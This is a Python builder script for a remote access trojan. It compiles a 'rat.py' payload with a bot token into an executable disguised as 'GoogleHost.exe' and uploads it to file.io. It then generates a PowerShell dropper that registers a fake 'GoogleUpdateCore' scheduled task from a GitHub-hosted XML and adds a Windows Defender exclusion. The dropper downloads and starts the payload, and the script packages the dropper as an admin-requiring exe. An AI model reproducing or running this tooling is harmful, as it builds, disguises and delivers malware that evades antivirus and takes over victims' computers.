import os
import shutil
import subprocess
import requests
from pathlib import Path
Uploader = bool(input("Do you want me to upload the file? (True, False)"))
if Uploader:
    Maker = bool(input("Do you want me to also make the dropper and convert it to exe? (True, False)"))
else:
    Maker = False
# Function to ask user for BOT_TOKEN and insert it at line 14 in the destination file
def insert_variable_at_line_14(source_file, destination_file, variable_name):
    variable_value = input(f"Please enter the value for {variable_name}: ")

    with open(source_file, 'r') as file:
        lines = file.readlines()
    
    # Prepare the new line to insert at line 14 (index 13)
    new_line = f"{variable_name} = '{variable_value}'\n"
    
    # Insert or append the new line at line 14
    if len(lines) >= 14:
        lines.insert(13, new_line)
    else:
        while len(lines) < 13:
            lines.append('\n')
        lines.append(new_line)
    
    # Write the modified lines to the destination file
    with open(destination_file, 'w') as file:
        file.writelines(lines)
    
    print(f"Variable '{variable_name}' has been inserted at line 14 in '{destination_file}'.")

# Function to run pyinstaller and create the executable
def create_executable_with_pyinstaller(destination_file):
    pyinstaller_command = [
        'pyinstaller', '--noconfirm', '--onefile', '--windowed',
        '--icon', r"C:\Users\Korisnik\Desktop\hidden\rat\Screenshot 2024-12-09 190259.ico",
        destination_file
    ]
    subprocess.run(pyinstaller_command, check=True)
    print(f"PyInstaller has created the executable for '{destination_file}'.")

# Function to delete temporary files and directories created by PyInstaller
def delete_temp_files():
    build_dir = 'build'
    spec_file = 'GoogleHost.spec'
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    if os.path.exists(spec_file):
        os.remove(spec_file)
    
    print("Temporary files and directories created by PyInstaller have been deleted.")

# Function to upload the executable to file.io
def upload_executable():
    res = requests.post(
        url=r'https://file.io',
        files={
        'file': Path('C:\\Users\\Korisnik\\Desktop\\hidden\\rat\\dist\\GoogleHost.exe').read_bytes()}
    )
    link = res.json()['link']
    print(f"File uploaded successfully. Download link: {link}")
    return link

# Function to create the PowerShell script with the file.io link
def create_powershell_script(link):
    powershell_script = f"""
mkdir C:\\Users\\Public\\Programs
curl.exe -o $env:temp/temp.xml "https://raw.githubusercontent.com/p0k0r0k0/certs/refs/heads/main/temp.xml"
schtasks /Create /tn GoogleUpdateCore /xml $env:temp/temp.xml
Add-MpPreference -ExclusionPath C:\\Users\\Public\\Programs\\
curl.exe -o C:\\Users\\Public\\Programs\\GoogleHost.exe "{link}"
start C:\\Users\\Public\\Programs\\GoogleHost.exe
cd $env:temp
start hide.vbs
exit
"""
    # Save the PowerShell script as dropper_uac_full.ps1
    with open("dropper_uac_full.ps1", 'w') as file:
        file.write(powershell_script)
    
    print("PowerShell script 'dropper_uac_full.ps1' has been created.")
def convert_ps1_to_exe():
    ps2exe_command = [
        'powershell', '-Command', 'ps2exe', '.\\dropper_uac_full.ps1', '.\\GOTOV\\dropper.exe',
        '-noConsole', '-noOutput', '-noError', '-requireAdmin'
    ]
    subprocess.run(ps2exe_command, check=True)
    print("PowerShell script has been converted to an executable 'dropper.exe'.")

source_file = 'rat.py'
destination_file = 'GoogleHost.py'
variable_name = 'BOT_TOKEN'

    # Step 1: Insert the variable into the code
insert_variable_at_line_14(source_file, destination_file, variable_name)

    # Step 2: Create executable with PyInstaller
create_executable_with_pyinstaller(destination_file)

    # Step 3: Delete temporary PyInstaller files
delete_temp_files()

    # Step 4: Upload the executable to file.io and get the link
if Uploader:
    link = upload_executable()

    if link and Maker:
            # Step 5: Create the PowerShell script with the obtained link
        create_powershell_script(link)
        convert_ps1_to_exe()
        
